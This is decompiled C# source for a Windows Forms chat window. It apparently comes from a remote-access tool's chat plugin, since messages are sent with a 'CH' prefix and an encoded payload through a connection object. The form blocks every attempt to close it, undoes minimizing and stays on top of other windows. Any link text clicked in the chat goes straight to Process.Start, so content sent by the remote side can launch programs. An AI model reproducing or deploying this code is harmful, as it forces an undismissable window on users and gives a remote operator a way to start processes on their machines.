using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace ch
{
	// Token: 0x02000008 RID: 8
	[DesignerGenerated]
	public partial class C : Form
	{
		// Token: 0x0600001D RID: 29 RVA: 0x00003730 File Offset: 0x00001B30
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = C.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = C.__ENCList.Count == C.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int num2 = 0;
						int num3 = C.__ENCList.Count - 1;
						int num4 = num2;
						for (;;)
						{
							int num5 = num4;
							int num6 = num3;
							if (num5 > num6)
							{
								break;
							}
							WeakReference weakReference = C.__ENCList[num4];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num4 != num;
								if (flag2)
								{
									C.__ENCList[num] = C.__ENCList[num4];
								}
								num++;
							}
							num4++;
						}
						C.__ENCList.RemoveRange(num, C.__ENCList.Count - num);
						C.__ENCList.Capacity = C.__ENCList.Count;
					}
					C.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00003834 File Offset: 0x00001C34
		public C()
		{
			base.Load += this.C_Load;
			C.__ENCAddToList(this);
			base.Resize += this.C_Resize;
			base.Load += this.C_Load;
			base.FormClosing += this.C_FormClosing;
			this.InitializeComponent();
		}

		// Token: 0x0600001F RID: 31 RVA: 0x000038A8 File Offset: 0x00001CA8
		private void Button1_Click(object sender, EventArgs e)
		{
			try
			{
				lock (this)
				{
					bool flag = Operators.CompareString(this.T2.Text, "", false) == 0;
					if (flag)
					{
						return;
					}
					string[] array = new string[7];
					array[0] = "CH";
					array[1] = this.A.Y;
					array[2] = this.A.OSK;
					array[3] = this.A.Y;
					array[4] = "@";
					array[5] = this.A.Y;
					TextBox t = this.T2;
					string text = t.Text;
					t.Text = text;
					array[6] = this.A.ENB(ref text);
					this.A.Send(string.Concat(array));
					this.T1.SelectionStart = this.T1.TextLength;
					this.T1.SelectionFont = new Font(this.T1.Font, FontStyle.Bold);
					this.T1.AppendText("[Me] ");
					this.T1.SelectionFont = this.T1.Font;
					this.T1.AppendText(this.T2.Text + "\r\n");
					this.T1.SelectionStart = this.T1.TextLength;
					this.T1.ScrollToCaret();
				}
				this.T2.Text = "";
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003A94 File Offset: 0x00001E94
		private void C_FormClosing(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003AA0 File Offset: 0x00001EA0
		private void C_Resize(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.WindowState == FormWindowState.Minimized;
				if (flag)
				{
					this.WindowState = FormWindowState.Normal;
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x06000024 RID: 36 RVA: 0x00004144 File Offset: 0x00002544
		// (set) Token: 0x06000025 RID: 37 RVA: 0x0000415C File Offset: 0x0000255C
		internal virtual TextBox T2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				KeyEventHandler keyEventHandler = new KeyEventHandler(this.T2_KeyDown);
				bool flag = this._T2 != null;
				if (flag)
				{
					this._T2.KeyDown -= keyEventHandler;
				}
				this._T2 = value;
				flag = this._T2 != null;
				if (flag)
				{
					this._T2.KeyDown += keyEventHandler;
				}
			}
		}

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x06000026 RID: 38 RVA: 0x000041BC File Offset: 0x000025BC
		// (set) Token: 0x06000027 RID: 39 RVA: 0x000041D4 File Offset: 0x000025D4
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button1 = value;
			}
		}

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x06000028 RID: 40 RVA: 0x000041E0 File Offset: 0x000025E0
		// (set) Token: 0x06000029 RID: 41 RVA: 0x000041F8 File Offset: 0x000025F8
		internal virtual PictureBox PictureBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox3 = value;
			}
		}

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x0600002A RID: 42 RVA: 0x00004204 File Offset: 0x00002604
		// (set) Token: 0x0600002B RID: 43 RVA: 0x0000421C File Offset: 0x0000261C
		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x0600002C RID: 44 RVA: 0x00004228 File Offset: 0x00002628
		// (set) Token: 0x0600002D RID: 45 RVA: 0x00004240 File Offset: 0x00002640
		internal virtual Panel Panel2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel2 = value;
			}
		}

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x0600002E RID: 46 RVA: 0x0000424C File Offset: 0x0000264C
		// (set) Token: 0x0600002F RID: 47 RVA: 0x00004264 File Offset: 0x00002664
		internal virtual RichTextBox T1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				LinkClickedEventHandler linkClickedEventHandler = new LinkClickedEventHandler(this.T1_LinkClicked);
				bool flag = this._T1 != null;
				if (flag)
				{
					this._T1.LinkClicked -= linkClickedEventHandler;
				}
				this._T1 = value;
				flag = this._T1 != null;
				if (flag)
				{
					this._T1.LinkClicked += linkClickedEventHandler;
				}
			}
		}

		// Token: 0x1700000C RID: 12
		// (get) Token: 0x06000030 RID: 48 RVA: 0x000042C4 File Offset: 0x000026C4
		// (set) Token: 0x06000031 RID: 49 RVA: 0x000042DC File Offset: 0x000026DC
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x1700000D RID: 13
		// (get) Token: 0x06000032 RID: 50 RVA: 0x000042E8 File Offset: 0x000026E8
		// (set) Token: 0x06000033 RID: 51 RVA: 0x00004300 File Offset: 0x00002700
		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= eventHandler;
				}
				this._Timer1 = value;
				flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick += eventHandler;
				}
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00004360 File Offset: 0x00002760
		private void RichTextBox2_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00004364 File Offset: 0x00002764
		private void T2_KeyDown(object sender, KeyEventArgs e)
		{
			try
			{
				bool flag = e.KeyCode == Keys.Return;
				if (flag)
				{
					e.SuppressKeyPress = true;
					lock (this)
					{
						flag = Operators.CompareString(this.T2.Text, "", false) == 0;
						if (flag)
						{
							return;
						}
						string[] array = new string[7];
						array[0] = "CH";
						array[1] = this.A.Y;
						array[2] = this.A.OSK;
						array[3] = this.A.Y;
						array[4] = "@";
						array[5] = this.A.Y;
						TextBox t = this.T2;
						string text = t.Text;
						t.Text = text;
						array[6] = this.A.ENB(ref text);
						this.A.Send(string.Concat(array));
						this.T1.SelectionStart = this.T1.TextLength;
						this.T1.SelectionFont = new Font(this.T1.Font, FontStyle.Bold);
						this.T1.AppendText("Me : ");
						this.T1.SelectionFont = this.T1.Font;
						this.T1.AppendText(this.T2.Text + "\r\n");
						this.T1.SelectionStart = this.T1.TextLength;
						this.T1.ScrollToCaret();
					}
					this.T2.Text = "";
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000036 RID: 54 RVA: 0x0000456C File Offset: 0x0000296C
		private void T1_LinkClicked(object sender, LinkClickedEventArgs e)
		{
			try
			{
				Process.Start(e.LinkText);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000037 RID: 55 RVA: 0x000045BC File Offset: 0x000029BC
		private void C_Load(object sender, EventArgs e)
		{
			this.T2.Select();
			this.Show();
			this.Icon = null;
			this.TopMost = true;
			this.WindowState = FormWindowState.Normal;
			this.x = checked(Screen.PrimaryScreen.WorkingArea.Width - this.Width);
			this.y = Screen.PrimaryScreen.WorkingArea.Height;
			Point point = new Point(this.x, this.y);
			this.Location = point;
			this.TopMost = true;
			this.Timer1.Start();
			this.Label1.Text = this.Hk;
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00004670 File Offset: 0x00002A70
		private void Timer1_Tick(object sender, EventArgs e)
		{
			checked
			{
				bool flag = this.y > Screen.PrimaryScreen.WorkingArea.Height - this.Height;
				if (flag)
				{
					this.y -= 2;
					Point point = new Point(this.x, this.y);
					this.Location = point;
				}
			}
		}

		// Token: 0x0400000E RID: 14
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x0400000F RID: 15
		public A A;

		// Token: 0x04000011 RID: 17
		[AccessedThroughProperty("T2")]
		private TextBox _T2;

		// Token: 0x04000012 RID: 18
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000013 RID: 19
		[AccessedThroughProperty("PictureBox3")]
		private PictureBox _PictureBox3;

		// Token: 0x04000014 RID: 20
		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		// Token: 0x04000015 RID: 21
		[AccessedThroughProperty("Panel2")]
		private Panel _Panel2;

		// Token: 0x04000016 RID: 22
		[AccessedThroughProperty("T1")]
		private RichTextBox _T1;

		// Token: 0x04000017 RID: 23
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x04000018 RID: 24
		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		// Token: 0x04000019 RID: 25
		public string Hk;

		// Token: 0x0400001A RID: 26
		private int x;

		// Token: 0x0400001B RID: 27
		private int y;
	}
}
